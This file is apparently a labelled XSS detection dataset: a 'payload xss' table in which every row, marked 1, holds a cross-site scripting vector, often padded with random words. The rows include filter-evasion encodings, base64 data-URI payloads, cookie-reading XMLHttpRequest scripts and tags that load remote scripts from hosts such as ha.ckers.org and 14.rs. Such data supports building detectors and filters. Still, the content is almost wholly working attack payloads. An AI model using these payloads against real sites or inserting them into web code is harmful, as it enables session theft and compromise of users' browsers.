payload	xss
encouraged <iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe> lithographical	1
kerwham <iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open(&quotGET&quot,&quothttp://xssme.html5sec.org/xssme2&quot,false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>	1
&ltiframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;&ltscript&gtr=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}&lt\/script&gt%26quot;)%22&gt&lt/iframe&gt	1
poggy &ltscript>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();&lt/script>#	1
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();	1
herbosity <textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>	1
truth-dictated <textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea> preens	1
nectarin <iframe onload=%22write('<script&gt'%2Blocation.hash.substr(1)%2B'</script&gt')%22&gt</iframe&gt#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();	1
pro-Spain <textarea id=ta&gt</textarea&gt<script&gtta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script&gt	1
<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();	1
nonprosperously &lttextarea id=ta onfocus=%22write(&quot&ltscript>alert(1)&lt/script>&quot)%22 autofocus>&lt/textarea> Salaidh	1
<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>	1
Laclos <script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open(&quotGET&quot, &quothttp://xssme.html5sec.org/xssme2&quot, true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = &quot(.*?)&quot/)[1]) };xhr.send(); trusting	1
acquisita %3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E	1
&ltiframe src=`http://xssme.html5sec.org/?xss=&ltiframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>	1
Richers <a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E	1
checkbooks &lta target="x" href="xssme?xss=&ltscript>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)&lt/script>#&ltiframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk>&lt/iframe> Dorsman	1
curricular <a target=&quotx&quot href=&quotxssme?xss=<script>find(&quotcookie&quot); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate(&quot//script/text()&quot, doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = &quot(.*?)&quot/)[1])</script> redescription	1
Badger <a target="x" href="xssme?xss=<script&gtfunction x(window) { eval(location.hash.substr(1)) }</script&gt<iframe src=%22javascript:parent.x(window);%22&gt</iframe&gt#var xhr = new window.XMLHttpRequest();xhr.open(&quotGET&quot, &quot.&quot, true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = &quot(.*?)&quot/)[1]) };xhr.send();	1
Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>	1
entertainable &lta href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;">&ltbutton>	1
cuapinole <div onmouseover=&quotalert&lpar;1&rpar;&quot>DIV</div>	1
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"&gt	1
rabbler <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;"&gtX</a&gt spitish	1
Triunitarian <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?	1
undersomething <object data=&quothttp://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot&gt? Clarksdale	1
<var onmouseover=&quotprompt(1)&quot>On Mouse Over</var>?	1
Corapeake &lta href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here&lt/a> strophoid	1
<img src="/" =_=" title="onerror=&quotprompt(1)&quot">	1
surface-dwelling <%<!--&quot%&gt<script&gtalert(1);</script --&gt	1
bielenite <script src=&quotdata:text/javascript,alert(1)&quot></script> trucks	1
ennuyee &ltiframe/src \/\/onload = prompt(1)	1
cytopahgous <iframe/onreadystatechange=alert(1)	1
<svg/onload=alert(1)	1
ells <input value=<><iframe/src=javascript:confirm(1)	1
louisine <input type="text" value=``<div/onmouseover='alert(1)'&gtX</div&gt lowerer	1
unconsigned http://www.<script>alert(1)</script .com	1
ejects <iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?	1
after-game <svg><script ?>alert(1)	1
Porrima <iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>	1
<img src=`xx:xx`onerror=alert(1)&gt	1
&ltobject type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ ">&lt/object>	1
wampished <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>? valiances	1
myarian <math><a xlink:href=&quot//jsfiddle.net/t846h/&quot>click Un-romanized	1
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always&gt?	1
untextual &ltsvg contentScriptType=text/vbs>&ltscript>MsgBox+1	1
metratonia <a href=&quotdata:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>&quot>X</a	1
exploratively <iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074(&quot\u0061&quot) worksinIE>	1
<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+	1
audio <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F Soutor	1
&ltscript/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)>&lt/script ????????????	1
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)&gt	1
lamini- <script>+-+-1-+-+alert(1)</script>	1
craftspeople &ltbody/onload=&lt;!--&gt;&#10alert(1)>	1
panhygrous <script itworksinallbrowsers>/*<script* */alert(1)</script ? thermostated	1
<img src ?itworksonchrome?\/onerror = alert(1)???	1
<svg><script>//&NewLine;confirm(1);</script </svg>	1
trivia <svg&gt<script onlypossibleinopera:-)&gt alert(1) aldol	1
&lta aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe	1
synchondrosially <script x> alert(1) </script 1=2	1
&ltdiv/onmouseover='alert(1)'&gt style="x:"&gt	1
<--`<img/src=` onerror=alert(1)> --!>	1
trist <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ? undevious	1
jampani <div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>? huskwort	1
"&gt<img src=x onerror=window.open('https://www.google.com/');&gt	1
bushwalking &ltform>&ltbutton formaction=javascript&colon;alert(1)>CLICKME	1
milked <math><a xlink:href=&quot//jsfiddle.net/t846h/&quot>click	1
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt</object&gt?	1
grownup <iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt</iframe&gt	1
whampee <a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"&gtClick  Me</a&gt	1
anmia "&gt<img src=x onerror=prompt(1);&gt	1
lionet <SCRIPT>alert('XSS');</SCRIPT> Menashem	1
Pedricktown '';!--"<XSS&gt=&{()}	1
stewable <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>	1
quilly &ltIMG SRC="javascript:alert(&quotXSS&quot);">	1
Aveline <IMG SRC=javascript:alert('XSS')> constructively	1
<IMG SRC=JaVaScRiPt:alert('XSS')&gt	1
Lisabet <IMG SRC=javascript:alert(&quot;XSS&quot;)&gt vociferosity	1
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>	1
Trubow <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>	1
SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>	1
raisin <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> titer	1
shinleaves <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> hamperer	1
<IMG SRC="jav ascript:alert(&quotXSS&quot);">	1
&ltIMG SRC="jav&#x09;ascript:alert(&quotXSS&quot);">	1
none-so-pretties &ltIMG SRC="jav&#x0A;ascript:alert('XSS');">	1
nutsedges &ltIMG SRC="jav&#x0D;ascript:alert('XSS');"&gt Pishquow	1
<IMG SRC=" &#14;  javascript:alert('XSS');">	1
Hasmonaean &ltSCRIPT/XSS SRC="http://ha.ckers.org/xss.js">&lt/SCRIPT> transfigurate	1
news-writer &ltSCRIPT SRC=http://ha.ckers.org/xss.js?&ltB> terpadiene	1
<IMG SRC=&quotjavascript:alert(&quotXSS&quot)&quot	1
<SCRIPT>a=/XSS/	1
\";alert('XSS');//	1
&ltINPUT TYPE=&quotIMAGE&quot SRC=&quotjavascript:alert('XSS');&quot>	1
tylote <BODY BACKGROUND=&quotjavascript:alert('XSS')&quot&gt	1
<BODY ONLOAD=alert('XSS')>	1
<IMG DYNSRC="javascript:alert('XSS')"&gt	1
&ltIMG LOWSRC=&quotjavascript:alert('XSS')&quot>	1
overhappily <BGSOUND SRC=&quotjavascript:alert('XSS');&quot&gt	1
Atka <BR SIZE="&{alert('XSS')}">	1
rockoons <LAYER SRC=&quothttp://ha.ckers.org/scriptlet.html&quot&gt</LAYER&gt bejape	1
dry-ki &ltLINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt	1
depositories <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">	1
thegn-born <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>	1
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">	1
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>	1
whiskerer <IMG SRC='vbscript:msgbox("XSS")'> apprompt	1
tassies <IMG SRC=&quotmocha:[code]&quot> bricoles	1
<IMG SRC="livescript:[code]">	1
astrocompass &ltMETA HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(&quotXSS&quot);"> widu	1
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">	1
blossombill <META HTTP-EQUIV=&quotLink&quot Content=&quot<javascript:alert(&quotXSS&quot)>; REL=stylesheet&quot> ensilage	1
<META HTTP-EQUIV=&quotrefresh&quot CONTENT=&quot0; URL=http://;URL=javascript:alert('XSS');&quot>	1
<IFRAME SRC=&quotjavascript:alert('XSS');&quot&gt</IFRAME&gt	1
<FRAMESET><FRAME SRC=&quotjavascript:alert('XSS');&quot></FRAMESET>	1
&ltTABLE BACKGROUND="javascript:alert(&quotXSS&quot)">	1
<DIV STYLE="background-image: url(javascript:alert('XSS'))">	1
Sen-tamil &ltDIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">	1
uncheerable <DIV STYLE="width: expression(alert(&quotXSS&quot));">	1
physicalness <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE> Edriasteroidea	1
&ltIMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">	1
debbies <XSS STYLE="xss:expression(alert('XSS'))"&gt Pro-cantonese	1
visioning exp/*<XSS STYLE=&quotno\xss:noxss("*//*");	1
<STYLE TYPE=&quottext/javascript&quot&gtalert('XSS');</STYLE&gt	1
sparkle-drifting &ltSTYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt/STYLE>&ltA CLASS=XSS>&lt/A>	1
aggrievedness <STYLE type="text/css">BODY{background:url("javascript:alert(&quotXSS&quot)")}</STYLE>	1
Leopoldo <BASE HREF="javascript:alert('XSS');//">	1
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>	1
hysterias <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(&quotXSS&quot)></OBJECT> drayages	1
getURL("javascript:alert('XSS')")	1
lateenrigged a="get";	1
dinical <!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=&quotjavas<![CDATA[cript:alert(&quotXSS&quot);&quot> hempen	1
nitramin <XML SRC=&quothttp://ha.ckers.org/xsstest.xml&quot ID=I&gt</XML&gt Mirabel	1
unstridently <HTML><BODY> foggages	1
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>	1
<!--#exec cmd="/bin/echo &quot<SCRIPT SRC&quot"--><!--#exec cmd="/bin/echo &quot=http://ha.ckers.org/xss.js></SCRIPT>&quot"-->	1
detoxes &lt? echo('&ltSCR)';	1
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt	1
organizable <HEAD&gt<META HTTP-EQUIV=&quotCONTENT-TYPE&quot CONTENT=&quottext/html; charset=UTF-7&quot&gt </HEAD&gt+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-	1
hektoliter <SCRIPT a=&quot&gt&quot SRC=&quothttp://ha.ckers.org/xss.js&quot&gt</SCRIPT&gt	1
pelmata &ltSCRIPT a="&gt" '' SRC="http://ha.ckers.org/xss.js"&gt&lt/SCRIPT&gt	1
&ltSCRIPT "a=&quot>&quot" SRC="http://ha.ckers.org/xss.js">&lt/SCRIPT>	1
<SCRIPT a=`&gt` SRC=&quothttp://ha.ckers.org/xss.js&quot&gt</SCRIPT&gt	1
bitonality <SCRIPT>document.write(&quot<SCRI&quot);</SCRIPT>PT SRC=&quothttp://ha.ckers.org/xss.js&quot></SCRIPT>	1
kenmpy &ltsvg%0Aonload=%09((pro\u006dpt))()//	1
cossyrite <sCriPt x>(((confirm)))``</scRipt x> inedible	1
&ltw=&quot/x=&quoty>&quot/OndbLcLick=`&lt`[confir\u006d``]>z	1
Sabbatist <deTAiLs/open/oNtoGGle=confirm()>	1
underrower <scRiPt y="&gt<"&gt/*<sCRipt* */prompt()</script pingster	1
&ltA href=&quotjavascript%26colon;confirm()&quot&gtclick	1
cuckooing <sVg oNloaD=write()>	1
&ltA href=javas%26#99;ript:alert(1)>click	1
obside <sCrIpt/&quot<a&quot/srC=data:=&quot.<a,[8].some(confirm)> red-ink	1
<svG/x=&quot>&quot/oNloaD=confirm()//	1
energises &lt--`&ltiMG/srC=` onerror=confirm``> --!>	1
addressor &ltSVg &lt/onlOad =&quot1> (_=prompt,_(1)) &quot&quot>	1
Russel <!--><scRipT src=//14.rs>	1
unjealously <sCriPt/src=//14.rs?	1
<sCRIpt x=&quot>&quot src=//15.rs></script>	1
&ltD3/OnMouSEenTer=[2].find(confirm)>z	1
alveolotomy <D3"<"/OncLick="1>[confirm``]"<">z	1
quodded <D3/OnpOinTeReENter=confirm``&gtclick here	1
flneur <!&quot/*"/*/&quot/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>	1
agorae <Z oncut=alert()>x incompetent's	1
turnwrest <iFrAMe/src \/\/onload = prompt(1)	1
amniatic &ltdETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x&gt	1
>>> vectors()	1
eburnated <div id=&quot1&quot><form id=&quottest&quot></form><button form=&quottest&quot formaction=&quotjavascript:alert(1)&quot>X</button>//[&quot'`-->]]>]</div><div id=&quot2&quot><meta charset=&quotx-imap4-modified-utf7&quot>&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//[&quot'`-->]]>]</div><div id=&quot3&quot><meta charset=&quotx-imap4-modified-utf7&quot>&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[&quot'`-->]]>]</div><div id=&quot4&quot>0?<script>Worker(&quot#&quot).onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[&quot'`-->]]>]</div><div id=&quot5&quot><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[&quot'`-->]]>]</div><div id=&quot6&quot><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[&quot'`-->]]>]</div><div id=&quot7&quot><input onfocus=alert(7) autofocus>//[&quot'`-->]]>]</div><div id=&quot8&quot><input onblur=alert(8) autofocus><input autofocus>//[&quot'`-->]]>]</div><div id=&quot9&quot><a style=&quot-o-link:'javascript:alert(9)';-o-link-source:current&quot>X</a>//[&quot'`-->]]>]</div><div id=&quot10&quot><video poster=javascript:alert(10)//></video>//[&quot'`-->]]>]</div><div id=&quot11&quot><svg xmlns=&quothttp://www.w3.org/2000/svg&quot><g onload=&quotjavascript:alert(11)&quot></g></svg>//[&quot'`-->]]>]</div><div id=&quot12&quot><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//[&quot'`-->]]>]</div><div id=&quot13&quot><x repeat=&quottemplate&quot repeat-start=&quot999999&quot>0<y repeat=&quottemplate&quot repeat-start=&quot999999&quot>1</y></x>//[&quot'`-->]]>]</div><div id=&quot14&quot><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//[&quot'`-->]]>]</div><div id=&quot15&quot><script>({0:#0=alert/#0#/#0#(0)})</script>//[&quot'`-->]]>]</div><div id=&quot16&quot>X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[&quot'`-->]]>]</div><div id=&quot17&quot><?xml-stylesheet href=&quotjavascript:alert(17)&quot?><root/>//[&quot'`-->]]>]</div><div id=&quot18&quot><script xmlns=&quothttp://www.w3.org/1999/xhtml&quot>&#x61;l&#x65;rt&#40;1)</script>//[&quot'`-->]]>]</div><div id=&quot19&quot><meta charset=&quotx-mac-farsi&quot>¼script ¾alert(19)//¼/script ¾//[&quot'`-->]]>]</div><div id=&quot20&quot><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[&quot'`-->]]>]</div><div id=&quot21&quot><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[&quot'`-->]]>]</div><div id=&quot22&quot><input onblur=focus() autofocus><input>//[&quot'`-->]]>]</div><div id=&quot23&quot><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//[&quot'`-->]]>]</div><div id=&quot24&quot>1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//[&quot'`-->]]>]</div><div id=&quot25&quot><script src=&quot#&quot>{alert(25)}</script>;1//[&quot'`-->]]>]</div><div id=&quot26&quot>+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[&quot'`-->]]>]</div><div id=&quot27&quot><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[&quot'`-->]]>]</div>	1
overskip <div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//["'`-->]]>]</div> bergamiol	1
